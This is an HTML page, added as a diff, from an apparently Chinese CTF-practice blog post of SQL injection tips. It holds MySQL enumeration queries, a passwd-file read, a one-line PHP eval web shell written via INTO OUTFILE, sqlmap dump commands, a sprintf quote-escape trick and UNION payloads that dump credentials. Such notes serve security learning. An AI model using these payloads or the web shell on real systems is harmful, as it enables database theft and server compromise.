@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#d8f3ff">
+<title>sql注入的一些tip</title>
+
+  <style>
+    :root { --wallpaper: url("/images/wallpaper.jpg"); }
+  </style>
+
+<link rel="stylesheet" href="/css/main.css">
+<script defer src="/js/main.js"></script>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+<body class="theme-mac js is-article-page has-wallpaper">
+  <div class="menu-bar">
+  <div class="menu-left">
+    <div class="menu-apple" id="menu-apple">
+      <button class="menu-apple-btn" id="menu-apple-btn" type="button" aria-haspopup="true" aria-expanded="false" aria-label="Apple">
+        <svg class="menu-apple-icon" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M16.36 2.2c0 1.05-.43 2.06-1.15 2.8-.8.83-2.12 1.47-3.25 1.39-.13-1.11.34-2.2 1.1-2.95.75-.81 2.06-1.42 3.3-1.24z"/>
+          <path d="M19.2 8.3c-.97-1.23-2.32-1.95-3.59-1.95-1.69 0-2.4.81-3.58.81-1.21 0-2.12-.79-3.6-.79-1.43 0-2.95.87-3.92 2.36-1.37 2.1-1.13 6.05 1.08 9.42.8 1.21 1.86 2.57 3.23 2.56 1.19-.01 1.53-.76 3.2-.76 1.67 0 1.98.76 3.19.75 1.41-.01 2.55-1.51 3.33-2.72.58-.89.8-1.34 1.24-2.35-3.26-1.24-3.78-5.87-.58-7.33z"/>
+        </svg>
+      </button>
+      <div class="menu-dropdown" id="menu-apple-dropdown" role="menu">
+        <button class="menu-dropdown-item" type="button" data-open="about">关于本机</button>
+        <div class="menu-divider"></div>
+        <button class="menu-dropdown-item" type="button">系统设置...</button>
+        <button class="menu-dropdown-item" type="button">App Store...</button>
+        <div class="menu-divider"></div>
+        <button class="menu-dropdown-item" type="button">关机...</button>
+      </div>
+    </div>
+    <span class="menu-item brand">Finder</span>
+    <span class="menu-item">File</span>
+    <span class="menu-item">Edit</span>
+    <span class="menu-item">View</span>
+    <span class="menu-item">Go</span>
+    <span class="menu-item">Window</span>
+    <span class="menu-item">Help</span>
+  </div>
+  <div class="menu-right">
+    <span class="menu-item status icon" aria-label="WeChat" title="WeChat">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M8.5 6.5c-3.2 0-5.8 2.1-5.8 4.8 0 1.7 1 3.3 2.6 4.2l-.6 2.3 2.3-1.2c.5.1 1 .2 1.5.2 3.2 0 5.8-2.1 5.8-4.8S11.7 6.5 8.5 6.5z"/>
+        <path d="M15.5 11c3.1 0 5.7 2.1 5.7 4.7 0 1.5-.8 2.9-2.2 3.8l.5 2-2.1-1.1c-.4.1-.9.1-1.4.1-3.1 0-5.7-2.1-5.7-4.7S12.4 11 15.5 11z"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="QQ" title="QQ">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M7 18c-1.4 0-2.6 1-2.6 2.3 0 1.1 1 2.1 2.6 2.1h10c1.6 0 2.6-1 2.6-2.1 0-1.3-1.2-2.3-2.6-2.3"/>
+        <path d="M6.5 12.5c-1.2 2.1-1.7 4.2-1.7 5.5M17.5 12.5c1.2 2.1 1.7 4.2 1.7 5.5"/>
+        <path d="M12 4.2c-3.6 0-6.5 3-6.5 6.7 0 3.7 2.9 6.7 6.5 6.7s6.5-3 6.5-6.7c0-3.7-2.9-6.7-6.5-6.7z"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Bluetooth" title="Bluetooth">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M7 6l10 10-5 4V4l5 4-10 10"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Wi-Fi" title="Wi-Fi">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M3.5 9.5a12 12 0 0 1 17 0"/>
+        <path d="M6.8 12.8a7.2 7.2 0 0 1 10.4 0"/>
+        <path d="M10.4 16.4a2.6 2.6 0 0 1 3.2 0"/>
+        <circle cx="12" cy="19" r="1.2" fill="currentColor" stroke="none"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Battery" title="Battery">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <rect x="3" y="7.5" width="16" height="9" rx="2"/>
+        <rect x="19" y="10" width="2" height="4" rx="1"/>
+        <rect x="5.2" y="9.6" width="11.4" height="4.8" rx="1.2" fill="currentColor" stroke="none"/>
+      </svg>
+    </span>
+    <span class="menu-item" id="menu-time">--:--</span>
+  </div>
+</div>
+
+
+  <main class="desktop">
+    <div class="window wide reveal" style="--delay: 120ms;">
+      <div class="window-bar">
+        <div class="traffic">
+          <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+          <span class="traffic-dot yellow"></span>
+          <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+        </div>
+        <div class="window-title">sql注入的一些tip</div>
+        <div class="window-actions">
+          <a class="window-link" href="/">Desktop</a>
+          
+          
+            <a class="window-link" href="/2019/11/22/%E4%B9%8B%E5%89%8D%E7%9A%84/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%80%E4%BA%9Btip/" target="_blank" rel="noopener">Share</a>
+          
+        </div>
+      </div>
+      <div class="window-body">
+        
+        <div class="article-head">
+          <h1 class="article-title">sql注入的一些tip</h1>
+          
+            <div class="article-meta">2019-11-22</div>
+          
+        </div>
+        <article class="markdown">
+          <h4 id="一-基础语句"><a href="#一-基础语句" class="headerlink" title="一:基础语句"></a>一:基础语句</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">show databases;         //查看数据库</span><br><span class="line"></span><br><span class="line">use xxx;                //使用某个数据库</span><br><span class="line"></span><br><span class="line">show tables;            //查看该数据库的数据表</span><br><span class="line"></span><br><span class="line">desc xxx;               //查看该数据表的结构</span><br><span class="line"></span><br><span class="line">select * from xxx;      //查找某个数据表的所有内容</span><br><span class="line"></span><br><span class="line">select schema_name from information_schema.schemata;        //猜数据库</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;xxxxx&#x27;;                                //猜某数据库的数据表</span><br><span class="line"></span><br><span class="line">Select column_name from information_schema.columns where table_name=&#x27;xxxxx&#x27;;                                //猜某表的所有列</span><br><span class="line"></span><br><span class="line">left(a,b)       //从左侧截取 a 的前 b 位</span><br><span class="line"></span><br><span class="line">mid(column_name,start[,length])     //从位置start开始，截取column_name字符串的length位，与substr作用相同</span><br><span class="line"></span><br><span class="line">substr(string, start, length)       //从位置start开始，截取字符串string的length长度，与mid作用相同</span><br><span class="line"></span><br><span class="line">ascii()         //将某个字符转换成ascii码</span><br><span class="line"></span><br><span class="line">ord()           //将某个字符转换成ascii码，同ascii()</span><br><span class="line"></span><br><span class="line">select database() //当前数据库</span><br><span class="line"></span><br><span class="line">concat()  //能将一些字符串连接一个字符串适用于一条数据</span><br><span class="line"></span><br><span class="line">group_concat() //能够将一张表的数据的一些数据分组合并起来，适用性比较广</span><br><span class="line"></span><br><span class="line">select @@basedir; //显示文件根目录</span><br><span class="line">show variables like &quot;%char%&quot;;</span><br><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">select load_file(&#x27;/ect/passwd&#x27;); //读文件 需要开secure-file-priv=&#x27;/&#x27;</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php @eval($_post[&quot;mima&quot;])?&gt;&#x27; into outfile &quot;位置&quot; //写文件</span><br><span class="line"></span><br><span class="line">user(); //当前用户</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+
+<h3 id="二、sqlmap使用"><a href="#二、sqlmap使用" class="headerlink" title="二、sqlmap使用"></a>二、sqlmap使用</h3><p>github地址为<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a>，功能参考书<a target="_blank" rel="noopener" href="https://github.com/Kit4y/Sql-Injection/blob/master/Book/sqlmap%E6%95%99%E7%A8%8B.pdf">https://github.com/Kit4y/Sql-Injection/blob/master/Book/sqlmap教程.pdf</a></p>
+<h4 id="一些常用使用命令"><a href="#一些常用使用命令" class="headerlink" title="一些常用使用命令"></a>一些常用使用命令</h4><h5 id="1、是否能注入"><a href="#1、是否能注入" class="headerlink" title="1、是否能注入"></a>1、是否能注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>
+<h5 id="2、获取所有的数据库"><a href="#2、获取所有的数据库" class="headerlink" title="2、获取所有的数据库"></a>2、获取所有的数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --dbs</span><br></pre></td></tr></table></figure>
+<h5 id="3、当前库"><a href="#3、当前库" class="headerlink" title="3、当前库"></a>3、当前库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --current-db</span><br></pre></td></tr></table></figure>
+<h5 id="4、查询某数据库的所有表（比如security）"><a href="#4、查询某数据库的所有表（比如security）" class="headerlink" title="4、查询某数据库的所有表（比如security）"></a>4、查询某数据库的所有表（比如security）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;  -D security --tables</span><br></pre></td></tr></table></figure>
+<h5 id="5、暴力查询所有的表"><a href="#5、暴力查询所有的表" class="headerlink" title="5、暴力查询所有的表"></a>5、暴力查询所有的表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;   --tables</span><br></pre></td></tr></table></figure>
+<h5 id="6、列出security库中users表中的所有列"><a href="#6、列出security库中users表中的所有列" class="headerlink" title="6、列出security库中users表中的所有列"></a>6、列出security库中users表中的所有列</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;   -D security -T users --columns</span><br></pre></td></tr></table></figure>
+<p>(-D dbname指定数据库名称、-T tablename：指定某数据表的名称、–columns：列出指定表上的所有列)</p>
+<h5 id="7、导出三个数据列中所有的数据"><a href="#7、导出三个数据列中所有的数据" class="headerlink" title="7、导出三个数据列中所有的数据"></a>7、导出三个数据列中所有的数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;   -D security -T users -C id,username,password --dump</span><br></pre></td></tr></table></figure>
+<h5 id="8、提供一个sql-shell"><a href="#8、提供一个sql-shell" class="headerlink" title="8、提供一个sql shell"></a>8、提供一个sql shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --sql-shell</span><br></pre></td></tr></table></figure>
+<h5 id="9、post"><a href="#9、post" class="headerlink" title="9、post"></a>9、post</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u 登录的地址 --data &quot;userid=aaa&amp;passwd=bbbb&quot;</span><br></pre></td></tr></table></figure>
+<h5 id="10、添加前缀"><a href="#10、添加前缀" class="headerlink" title="10、添加前缀"></a>10、添加前缀</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--prefix=&quot;%1$\&#x27;&quot; -p username</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--cookie=&quot;PHPSESSID=cf49a9a60da9cc1b547ab98d549ba038&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://web59.buuoj.cn/admin.php?id=4&quot; --cookie=&quot;PHPSESSID=cf49a9a60da9cc1b547ab98d549ba038&quot; -T flag --dump --flush-session --fresh-queries --fresh-queries --delay 0.1</span><br></pre></td></tr></table></figure>
+<h4 id="sqlilabs搭建"><a href="#sqlilabs搭建" class="headerlink" title="sqlilabs搭建"></a>sqlilabs搭建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull acgpiano/sqli-labs</span><br><span class="line"></span><br><span class="line">docker run -dt --name sqli-lab -p [你要映射的端口]:80 acgpiano/sqli-labs:latest</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="三、注释问题"><a href="#三、注释问题" class="headerlink" title="三、注释问题"></a>三、注释问题</h3><h4 id="3-1、MySql–三种注释写法"><a href="#3-1、MySql–三种注释写法" class="headerlink" title="3.1、MySql–三种注释写法"></a>3.1、MySql–三种注释写法</h4><h5 id="3-1-1、"><a href="#3-1-1、" class="headerlink" title="3.1.1、--"></a>3.1.1、<code>--</code></h5><p>后面一定要加空格</p>
+<h5 id="3-1-2、"><a href="#3-1-2、" class="headerlink" title="3.1.2、#"></a>3.1.2、<code>#</code></h5><h5 id="3-1-3、"><a href="#3-1-3、" class="headerlink" title="3.1.3、/**/"></a>3.1.3、<code>/**/</code></h5><h4 id="3-2、注入尾部为什么是-而不是"><a href="#3-2、注入尾部为什么是-而不是" class="headerlink" title="3.2、注入尾部为什么是--+而不是--"></a>3.2、注入尾部为什么是<code>--+</code>而不是<code>--</code></h4><p>这里字符-和字符+在URL中都是有固定的含义的 , 比如说+就在URL编码中就代表空格 , 而URL编码中-不用编码。我们也可以不用+ 而使用空格的URL编码 , 那么编码得到的URL就应该是 :</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%27--%20</span><br></pre></td></tr></table></figure>
+<h4 id="3-3、-又为什么必须得编码-不编码可以吗"><a href="#3-3、-又为什么必须得编码-不编码可以吗" class="headerlink" title="3.3、#又为什么必须得编码 , 不编码可以吗 ?"></a>3.3、<code>#</code>又为什么必须得编码 , 不编码可以吗 ?</h4><p>不可以 , 因为# 在URL中是有固定的含义的 , 表示页面中的锚点 , 如果不进行编码浏览器就会将其当成页面的锚点 , 而这里我们是需要将其作为数据传输给服务器的 , 因此需要进行URL编码</p>
+<h3 id="四、补充mysql的一些函数"><a href="#四、补充mysql的一些函数" class="headerlink" title="四、补充mysql的一些函数"></a>四、补充mysql的一些函数</h3><h4 id="4-1、substr"><a href="#4-1、substr" class="headerlink" title="4.1、substr()"></a>4.1、substr()</h4><p>substr()函数是用来截取数据库某一列字段中的一部分<br>常用的方式是： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SBUSTR(str,pos); </span><br></pre></td></tr></table></figure>
+<p>就是从pos开始的位置，一直截取到最后。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSTR(str,pos,len);</span><br></pre></td></tr></table></figure>
+<p>这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。<br>需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始。<br>这点也很好理解，因为数据库不是我们平时写程序，他有他自己的一套习惯，数据库的记录都是从1开始没有从0开始</p>
+<h4 id="4-2、ascii-ord-函数"><a href="#4-2、ascii-ord-函数" class="headerlink" title="4.2、ascii(),ord()函数"></a>4.2、ascii(),ord()函数</h4><p>ASCII(str1)<br>返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii(&quot;a&quot;);</span><br><span class="line">+------------+</span><br><span class="line">| ascii(&quot;a&quot;) |</span><br><span class="line">+------------+</span><br><span class="line">|         97 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>ORD() 函数<br>ORD() 函数返回字符串第一个字符的ASCII 值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ord(&quot;a&quot;);</span><br><span class="line">+----------+</span><br><span class="line">| ord(&quot;a&quot;) |</span><br><span class="line">+----------+</span><br><span class="line">|       97 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h4 id="4-3、LEFT-函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。"><a href="#4-3、LEFT-函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。" class="headerlink" title="4.3、LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。"></a>4.3、LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LEFT(str,length);</span><br></pre></td></tr></table></figure>
+<p>LEFT()函数接受两个参数：<br>str是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select left(&quot;hello Kitty&quot;,5);</span><br><span class="line">+-----------------------+</span><br><span class="line">| left(&quot;hello Kitty&quot;,5) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| hello                 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>与之类似的是right(str,length);</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select right(&quot;hello Kitty&quot;,5);</span><br><span class="line">+------------------------+</span><br><span class="line">| right(&quot;hello Kitty&quot;,5) |</span><br><span class="line">+------------------------+</span><br><span class="line">| Kitty                  |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h4 id="4-4、REGEXP"><a href="#4-4、REGEXP" class="headerlink" title="4.4、REGEXP"></a>4.4、REGEXP</h4><p>可以在不使用数据库表的情况下用 SELECT 语句来测试正则表达式，REGEXP 检查总是返回0（没有匹配）或1（匹配）。可以用带文字串的 REGEXP 来测试表达式，并试验它们。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT &#x27;kitty&#x27; REGEXP &#x27;[0-9a-z]&#123;6&#125;&#x27;;</span><br><span class="line">+------------------------------+</span><br><span class="line">| &#x27;kitty&#x27; REGEXP &#x27;[0-9a-z]&#123;6&#125;&#x27; |</span><br><span class="line">+------------------------------+</span><br><span class="line">|                            0 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT &#x27;kitty&#x27; REGEXP &#x27;[0-9a-z]&#123;5&#125;&#x27;;</span><br><span class="line">+------------------------------+</span><br><span class="line">| &#x27;kitty&#x27; REGEXP &#x27;[0-9a-z]&#123;5&#125;&#x27; |</span><br><span class="line">+------------------------------+</span><br><span class="line">|                            1 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h4 id="4-5、MID"><a href="#4-5、MID" class="headerlink" title="4.5、MID()"></a>4.5、MID()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT MID(column_name,start[,length]) FROM table_name;</span><br></pre></td></tr></table></figure>
+<p>函数用于从文本字段中提取字符。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">| id | name         | url                       | alexa | country |</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">| 1  | Google       | https://www.google.cm/    | 1     | USA     |</span><br><span class="line">| 2  | 淘宝          | https://www.taobao.com/   | 13    | CN      |</span><br><span class="line">| 3  | 菜鸟教程      | http://www.runoob.com/    | 4689  | CN      |</span><br><span class="line">| 4  | 微博          | http://weibo.com/         | 20    | CN      |</span><br><span class="line">| 5  | Facebook      | https://www.facebook.com/ | 3     | USA     |</span><br><span class="line">| 7  | stackoverflow | http://stackoverflow.com/ |   0 | IND     |</span><br><span class="line">+----+---------------+---------------------------+-------+---------+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT MID(name,1,4) AS ShortTitle</span><br><span class="line">FROM Websites;</span><br></pre></td></tr></table></figure>
+<p>返回结果<br><img src="/13.png"></p>
+<h4 id="4-6、if"><a href="#4-6、if" class="headerlink" title="4.6、if()"></a>4.6、if()</h4><p> 在mysql中if()函数的用法类似于java中的三目表达式，其用处也比较多，具体语法如下：</p>
+<p>IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name,if(sex=0,&#x27;女&#x27;,&#x27;男&#x27;) as sex from student;</span><br><span class="line">+-------+-----+</span><br><span class="line">| name  | sex |</span><br><span class="line">+-------+-----+</span><br><span class="line">| name1 | 女  |</span><br><span class="line">| name2 | 女  |</span><br><span class="line">| name3 | 男  |</span><br><span class="line">| name4 | 女  |</span><br><span class="line">+-------+-----+</span><br><span class="line">rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<h3 id="五、sprintf格式化字符串带来的注入隐患"><a href="#五、sprintf格式化字符串带来的注入隐患" class="headerlink" title="五、sprintf格式化字符串带来的注入隐患"></a>五、sprintf格式化字符串带来的注入隐患</h3><p>语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">addslashes</span>(<span class="string">&quot;%1$&#x27; and 1=1#&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;AND b=&#x27;%s&#x27;&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">...</span><br><span class="line"><span class="variable">$sql</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;SELECT * FROM t WHERE a=&#x27;%s&#x27; <span class="subst">$b</span>&quot;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br></pre></td></tr></table></figure>
+<p>通过fuzz得知，在php的格式化字符串中，%后的一个字符(除了’%’)会被当作字符类型，而被吃掉，单引号’，斜杠\也不例外。</p>
+<p>如果能提前将%’ and 1&#x3D;1#拼接入sql语句，若存在SQLi过滤，单引号会被转义成&#39;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username = &#x27;%\&#x27; and 1=1#&#x27;;</span><br></pre></td></tr></table></figure>
+<p>然后这句sql语句如果继续进入格式化字符串，\会被%吃掉，’成功逃逸</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username = &#x27;%\&#x27; and 1=1#&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$args</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>( <span class="variable">$sql</span>, <span class="variable">$args</span> ) ;</span><br><span class="line"><span class="comment">//result: select * from user where username = &#x27;&#x27; and 1=1#&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>还可以使用%1$吃掉后面的斜杠，而不引起报错</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from user where username = &#x27;%1$\&#x27; and 1=1#&#x27; and password=&#x27;%s&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$args</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>( <span class="variable">$sql</span>, <span class="variable">$args</span>) ;</span><br><span class="line"><span class="comment">//result: select * from user where username = &#x27;&#x27; and 1=1#&#x27; and password=&#x27;admin&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>具体题目为下方的迎圣诞，拿大奖”活动赛题sqli</p>
+<h3 id="六、题目经典payload"><a href="#六、题目经典payload" class="headerlink" title="六、题目经典payload"></a>六、题目经典payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata%23</span><br><span class="line">-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#x27;security&#x27;%23</span><br><span class="line">-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#x27;users&#x27;%23</span><br><span class="line">-1&#x27; union select 1,group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure>
+
+
